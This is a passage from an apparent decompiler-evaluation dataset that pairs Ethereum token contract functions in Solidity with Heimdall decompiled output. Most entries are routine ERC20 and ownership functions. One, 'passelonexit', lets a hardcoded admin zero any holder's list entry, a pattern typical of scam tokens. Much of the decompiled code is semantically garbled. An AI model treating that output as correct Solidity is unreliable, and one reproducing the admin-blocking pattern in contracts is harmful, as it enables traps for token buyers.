}Unresolved_c9c65396(var_e); // call\n    }"}
{"contract_address": "0xc2473C13f1Ebb11A06997Cf5e40dB023F96A4DA1", "original_solidity_code": "function manualSwap() external {\\r\\n        require(_msgSender()==_taxWallet);\\r\\n        uint256 tokenBalance=balanceOf(address(this));\\r\\n        if(tokenBalance>0){\\r\\n          swapTokensForEth(tokenBalance);\\r\\n        }\\r\\n        uint256 ethBalance=address(this).balance;\\r\\n        if(ethBalance>0){\\r\\n          sendETHToFee(ethBalance);\\r\\n        }\\r\\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_h[var_a]);\n        store_g = 0x01000000000000000000000000000000000000000000 | (uint248(store_g));\n        var_c = 0x02;\n        uint256 var_d = var_d + 0x60;\n        var_e = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        address var_g = address(this);\n        var_h = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f).WETH(var_i); // staticcall\n        var_d = var_d + (uint248(ret0.length + 0x1f));\n        require(!(((var_d + ret0.length) - var_d) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_d.length == (address(var_d.length)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        uint256 var_j = address(var_d.length);\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(address(store_f), \"ERC20: approve to the zero address\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_f);\n        address var_b = keccak256(var_a);\n        storage_map_h[var_a] = storage_map_h[var_a];\n        address var_k = storage_map_h[var_a];\n        emit Approval(address(this), address(store_f), storage_map_h[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        address var_l = storage_map_h[var_a];\n        uint256 var_m = 0;\n        var_n = 0xa0;\n        uint256 var_p = var_d.length;\n        address var_o = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_f).code.length);\n        (bool success, bytes memory ret0) = address(store_f).Unresolved_791ac947(var_l); // call\n        store_g = uint248(store_g);\n        require(!address(this).balance);\n        (bool success, bytes memory ret0) = address(transferDelayEnabled / 0x0100).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xeE4121EC610aD03ad4b4b4151ccFB6999022Df86", "original_solidity_code": "function enableTrading() external onlyOwner {\\r\\n        tradingEnabled = true;\\r\\n        swapEnabled = true;\\r\\n    }", "heimdall_decompiled_code": "function enableTrading() public {\n        require(address(_owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        swapEnabled = (0x01 * 0x0100) | (uint248(swapEnabled));\n        swapEnabled = (0x01 * 0x010000) | (uint248(swapEnabled));\n    }"}
{"contract_address": "0x5B7b79708986436F7a90c33f0683841DaEC83810", "original_solidity_code": "function passelonexit(address jhhhqq) public    {\r\n        \r\n        require(_msgSender() == vipadmin123);   \r\n        if(_msgSender() == vipadmin123){\r\n        }else{\r\n        }\r\n        uint128 zrqqamount = 0;\r\n        xelonlist[jhhhqq] = zrqqamount; \r\n        \r\n    }", "heimdall_decompiled_code": "function passelonexit(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender) == (address(vipadmin123)));\n        address var_a = address(arg0);\n        var_b = 0x08;\n        storage_map_b[var_a] = 0;\n    }"}
{"contract_address": "0xe2BFF0b8121D4977F0aFd680dB7d3eADDa4Ab3Df", "original_solidity_code": "function setMaxWalletSize(uint256 maxWalletSize) public onlyOwner {\r\n_maxWallet = maxWalletSize;\r\n}", "heimdall_decompiled_code": "function setMaxWalletSize(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        _maxWallet = arg0;\n    }"}
{"contract_address": "0x693E9C1e8935caf91F006bf5a2FF8a1aB2C569c7", "original_solidity_code": "function setOwnerWallet(address payable newOwnerWallet) external onlyOwner {\r\n        tokenOwner = newOwnerWallet;\r\n    }", "heimdall_decompiled_code": "function setOwnerWallet(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(getOwner)), \"!Owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x06;\n        var_d = 0x214f776e65720000000000000000000000000000000000000000000000000000;\n        store_d = (address(arg0)) | (uint96(store_d));\n    }"}
{"contract_address": "0x57D9302e8B62a24e716C048f4925b2c74c9797dC", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0x20C7b73Be0B1AD179Db94e5b0AC9aD86fa0f068c", "original_solidity_code": "function openTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_g / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x17;\n        var_e = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_f = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_f));\n        require(0x09, \"ERC20: approve to the zero address\");\n        require(!0x05f5e100 | (0x01 == 0x01), \"ERC20: approve to the zero address\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(address(this) - 0, \"ERC20: approve to the zero address\");\n        require(address(store_f / 0x01) - 0, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x22;\n        var_e = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_f = address(this);\n        var_i = 0x02;\n        var_f = address(store_f / 0x01);\n        address var_i = keccak256(var_f);\n        storage_map_n[var_f] = 0x05f5e100;\n        var_a = 0x05f5e100;\n        emit Approval(address(this), address(store_f / 0x01), 0x05f5e100);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f / 0x01).factory(var_b); // staticcall\n        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_j == (address(var_j)));\n        var_k = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f / 0x01).WETH(var_d); // staticcall\n        var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_j == (address(var_j)));\n        var_l = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        address var_h = address(var_j);\n        (bool success, bytes memory ret0) = address(var_j).Unresolved_c9c65396(var_e); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x24;\n        var_e = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x09 > 0xff) {\n                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_g = 0x11;\n                        if (!0x0200 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                            var_g = 0x11;\n                            if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                if (!0x09 > 0x01) {\n                                    if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_g = 0x11;\n                                        if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                            var_g = 0x11;\n                                            if (!0x01) {\n                                            }\n                                            if (!0x3b9aca00 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_g = 0x11;\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xfecd919dfC1b878E072959250dC8AAA25ea814A4", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_e[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x59f53b5298b50696aA8995dda90D6a0bB77dE394", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        transferDelayEnabled=false;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        transferDelayEnabled = uint248(transferDelayEnabled);\n        if (0x09) {\n            if ((0x01 == 0x01) | !0x02540be400) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                var_a = 0x02540be400;\n                emit MaxTxAmountUpdated(0x02540be400);\n                if (0x0a) {\n                    if (0x0a == 0x01) {\n                        if (0x0a == 0x02) {\n                            if (!0x09 > 0xff) {\n                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_f = 0x11;\n                                if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                    if (!0x09 > 0x01) {\n                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                            var_f = 0x11;\n                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!0x01) {\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x59f53b5298b50696aA8995dda90D6a0bB77dE394", "original_solidity_code": "function updateFeeSell(uint256 newSellTax) external onlyOwner {\r\n        SellTax = newSellTax;\r\n        require(newSellTax <= 5);\r\n    }", "heimdall_decompiled_code": "function updateFeeSell(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        store_j = arg0;\n        require(!arg0 > 0x05);\n    }"}
{"contract_address": "0xeD90409D82B973b1D539F8f5D3e041c387916BbA", "original_solidity_code": "function isBot(address a) public view returns (bool){\r\n      return bots[a];\r\n    }", "heimdall_decompiled_code": "function isBot(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x04;\n        address var_c = !(!bytes1(storage_map_b[var_a] / 0x01));\n        return !(!bytes1(storage_map_b[var_a] / 0x01));\n    }"}
{"contract_address": "0x99D795eEDe17E3400f1Dd664fc1578CD93df464f", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0xaf820B5EA297f68B038B744AE2F5019B4fD2aC71", "original_solidity_code": "function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_a >> 0x01;\n                if (store_a) {\n                    if (store_a - ((store_a >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a >> 0x01) {\n                            if (0x1f < (store_a >> 0x01)) {\n                                var_a = 0x03;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x54eEA875389f51FB46A26Ea5a5DbBa480ca74339", "original_solidity_code": "function enableTrading() external onlyOwner {\r\n        require(!tradingActive, \"Trading already active.\");\r\n\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(\r\n            address(this),\r\n            uniswapV2Router.WETH()\r\n        );\r\n        _approve(address(this), address(uniswapV2Pair), type(uint256).max);\r\n        IERC20(uniswapV2Pair).approve(\r\n            address(uniswapV2Router),\r\n            type(uint256).max\r\n        );\r\n\r\n        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);\r\n        excludeFromMaxTransaction(address(uniswapV2Pair), true);\r\n\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(\r\n            address(this),\r\n            balanceOf(address(this)),\r\n            0,\r\n            0,\r\n            owner(),\r\n            block.timestamp\r\n        );\r\n        tradingActive = true;\r\n        swapEnabled = true;\r\n    }", "heimdall_decompiled_code": "function enableTrading() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(tradingActive)), \"Trading already active.\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x17;\n        var_d = 0x54726164696e6720616c7265616479206163746976652e000000000000000000;\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(0x7a250d5630b4cf539739df2c5dacb4c659f2488d).factory(var_b); // staticcall\n        uint256 var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!((var_e + ret0.length) - var_e) < 0x20);\n        require(var_e.length == (address(var_e.length)));\n        var_f = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(0x7a250d5630b4cf539739df2c5dacb4c659f2488d).WETH(var_c); // staticcall\n        var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!((var_e + ret0.length) - var_e) < 0x20);\n        require(var_e.length == (address(var_e.length)));\n        var_g = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_d = address(this);\n        uint256 var_h = address(var_e.length);\n        (bool success, bytes memory ret0) = address(var_e.length).{ value: 0 ether }Unresolved_c9c65396(var_d); // call\n    }"}
{"contract_address": "0xE575f6f50AF7A409F7381F15bC25Ff9dD9414660", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\\r\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\r\\n        _transferOwnership(newOwner);\\r\\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(_owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0) - 0, \"Ownable: new owner is the zero address\");\n        _owner = (address(arg0) * 0x01) | (uint96(_owner));\n        emit OwnershipTransferred(address(_owner / 0x01), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x26;\n        var_e = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_f = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x0D5bB4EE4e770C761F2F203c0828Eb2487A0Ab60", "original_solidity_code": "function approve(address spender, uint256 amount)\r\n        public\r\n        virtual\r\n        override\r\n        returns (bool)\r\n    {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x7435b0C4566F7eDe8d922841290a9cc552e1b96b", "original_solidity_code": "function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\\n        address owner = _msgSender();\\n        uint256 currentAllowance = allowance(owner, spender);\\n        require(currentAllowance >= subtractedValue, \\\"ERC20: decreased allowance below zero\\\");\\n    unchecked {\\n        _approve(owner, spender, currentAllowance - subtractedValue);\\n    }\\n\\n        return true;\\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: decreased allowance below zero\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77;\n        var_g = 0x207a65726f000000000000000000000000000000000000000000000000000000;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        uint256 var_c = storage_map_b[var_a] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] - arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xfc606C8F7141110c3f295a22004D274680A9A029", "original_solidity_code": "function changeOwner(address _owner) public onlyOwner {\r\n        owner = _owner;\r\n    }", "heimdall_decompiled_code": "function changeOwner(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = (address(arg0)) | (uint96(owner));\n    }"}
{"contract_address": "0x4884709C72961015D2f9e97D123f4a2E480B9014", "original_solidity_code": "function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_c) {\n            if (store_c - ((store_c >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_c >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_c >> 0x01;\n                if (store_c) {\n                    if (store_c - ((store_c >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_c >> 0x01) {\n                            if (0x1f < (store_c >> 0x01)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_c >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x2141a81Fbd52a193712C1d77440500e29aB0Fa63", "original_solidity_code": "function manualSwap() external {\r\n        require(_msgSender()==_taxWallet);\r\n        uint256 tokenBalance=balanceOf(address(this));\r\n        if(tokenBalance>0){\r\n          swapTokensForEth(tokenBalance);\r\n        }\r\n        uint256 ethBalance=address(this).balance;\r\n        if(ethBalance>0){\r\n          sendETHToFee(ethBalance);\r\n        }\r\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_h[var_a]);\n        store_g = 0x01000000000000000000000000000000000000000000 | (uint248(store_g));\n        var_c = 0x02;\n        uint256 var_d = var_d + 0x60;\n        var_e = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        address var_g = address(this);\n        var_h = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f).WETH(var_i); // staticcall\n        var_d = var_d + (uint248(ret0.length + 0x1f));\n        require(!(((var_d + ret0.length) - var_d) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_d.length == (address(var_d.length)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        uint256 var_j = address(var_d.length);\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(address(store_f), \"ERC20: approve to the zero address\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_f);\n        address var_b = keccak256(var_a);\n        storage_map_h[var_a] = storage_map_h[var_a];\n        address var_k = storage_map_h[var_a];\n        emit Approval(address(this), address(store_f), storage_map_h[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        address var_l = storage_map_h[var_a];\n        uint256 var_m = 0;\n        var_n = 0xa0;\n        uint256 var_p = var_d.length;\n        address var_o = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_f).code.length);\n        (bool success, bytes memory ret0) = address(store_f).Unresolved_791ac947(var_l); // call\n        store_g = uint248(store_g);\n        require(!address(this).balance);\n        (bool success, bytes memory ret0) = address(transferDelayEnabled / 0x0100).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xAe2D518A7c2fE465D3548825De14774282959862", "original_solidity_code": "function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n    require(_balances[_msgSender()] >= amount, \"TT: transfer amount exceeds balance\");\r\n    _balances[_msgSender()] -= amount;\r\n    _balances[recipient] += amount;\r\n\r\n    emit Transfer(_msgSender(), recipient, amount);\r\n    return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x01;\n        require(!(arg1 > storage_map_b[var_a]), \"TT: transfer amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x54543a207472616e7366657220616d6f756e7420657863656564732062616c61;\n        var_g = 0x6e63650000000000000000000000000000000000000000000000000000000000;\n        var_a = msg.sender;\n        var_b = 0x01;\n        require(!(storage_map_b[var_a] - arg1) > storage_map_b[var_a]);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_a = address(arg0);\n        var_b = 0x01;\n        require(!storage_map_b[var_a] > (arg1 + storage_map_b[var_a]));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        uint256 var_c = arg1;\n        emit Transfer(msg.sender, address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n    }"}
